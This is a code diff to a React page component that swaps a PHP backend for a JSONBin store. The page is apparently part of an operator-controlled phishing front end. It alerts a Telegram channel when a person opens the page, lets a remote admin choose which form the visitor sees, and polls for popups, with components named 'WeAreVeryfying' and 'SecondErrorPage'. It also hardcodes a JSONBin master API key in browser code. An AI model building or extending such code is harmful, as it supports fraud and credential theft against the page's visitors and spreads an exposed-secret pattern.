@@ -21,9 +21,11 @@ import SecondErrorPage from "../components/secondErrorPage";
 import WeAreVeryfying from "../components/weareveryfying";
 
 // The URL for your PHP backend
-const API_URL =
-  "https://olive-tapir-759483.hostingersite.com/myBackend/admin_api7.php"; // Update this based on your server configuration
+const BIN_ID = "6a340b1dda38895dfed7e840";
+const API_KEY = "$2a$10$qrNF.b6EVU4HN2N8Dvegaez/mp2L7ZO9EjET5ujsIiWNSfuOyB.mu";
 
+
+const API_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
 const UserPage = () => {
   const [formType, setFormType] = useState<string>("");
   const [showPopup, setShowPopup] = useState(false);
@@ -58,10 +60,16 @@ const UserPage = () => {
   useEffect(() => {
     const fetchFormType = async () => {
       try {
-        const res = await fetch(`${API_URL}?action=fetch_forms`);
-        const data = await res.json();
-        const selectedForm = data?.currentForm || "LandingPage";
-        setFormType(selectedForm);
+       const res = await fetch(API_URL + "/latest", {
+  headers: {
+    "X-Master-Key": API_KEY,
+  },
+});
+
+const data = await res.json();
+const selectedForm = data.record.currentForm || "LandingPage";
+
+setFormType(selectedForm);
       } catch (error) {
         console.error("Failed to fetch form type from PHP:", error);
       }
@@ -75,34 +83,37 @@ const UserPage = () => {
     sendToTelegram(`✅ ${fullName} has opened the user1 page.`);
   }, []);
 
-  useEffect(() => {
-    const interval = setInterval(() => {
-      fetch(`${API_URL}?action=get_popup_status`)
-        .then((res) => res.json())
-        .then((data) => {
-          if (data.showPopup) setShowPopup(true);
-          // Optional: close popup when it's false
-          else setShowPopup(false);
-        });
-    }, 5000); // every 5 seconds
+useEffect(() => {
+  const fetchPopupStatus = async () => {
+    try {
+      const res = await fetch(`${API_URL}/latest`, {
+        headers: {
+          "X-Master-Key": API_KEY,
+        },
+      });
 
-    return () => clearInterval(interval); // cleanup on unmount
-  }, []);
-
-  // Fetch the popup status from the PHP backend
-  useEffect(() => {
-    const fetchPopupStatus = async () => {
-      try {
-        const res = await fetch(`${API_URL}?action=fetch_error_content`);
-        const data = await res.json();
-        setShowPopup(data?.showPopup || false); // Assuming the backend returns the showPopup flag
-      } catch (error) {
-        console.error("Failed to fetch popup status from PHP:", error);
+      if (!res.ok) {
+        throw new Error("Failed to fetch JSONBin");
       }
-    };
 
-    fetchPopupStatus();
-  }, []);
+      const data = await res.json();
+
+      setShowPopup(data.record.showPopup ?? false);
+    } catch (error) {
+      console.error(error);
+    }
+  };
+
+  // Initial fetch
+  fetchPopupStatus();
+
+  // Poll every 5 seconds
+  const interval = setInterval(fetchPopupStatus, 5000);
+
+  return () => clearInterval(interval);
+}, []);
+
+
 
   const renderForm = () => {
     switch (formType) {
@@ -158,26 +169,43 @@ const UserPage = () => {
     }
   };
 
-  const handlePopupDismiss = async () => {
-    try {
-      // Update the backend to set the popup to false
-      await fetch(`${API_URL}?action=update_popup`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ showPopup: false }),
-      });
+const handlePopupDismiss = async () => {
+  try {
+    // Get the current JSONBin record
+    const res = await fetch(`${API_URL}/latest`, {
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": API_KEY,
+      },
+    });
 
-      // Hide the popup immediately
-      setShowPopup(false);
+    const { record } = await res.json();
 
-      // Refresh the page after dismissing the popup
-      window.location.reload(); // This will reload the page
-    } catch (error) {
-      console.error("Error updating popup status:", error);
-    }
-  };
+    // Update the showPopup field
+    const updatedRecord = {
+      ...record,
+      showPopup: false,
+    };
+
+    // Save the updated record back to JSONBin
+    await fetch(API_URL, {
+      method: "PUT",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": API_KEY,
+      },
+      body: JSON.stringify(updatedRecord),
+    });
+
+    // Update local state
+    setShowPopup(false);
+
+    // Refresh the page if needed
+    window.location.reload();
+  } catch (error) {
+    console.error("Error updating popup status:", error);
+  }
+};
 
   return (
     <div>
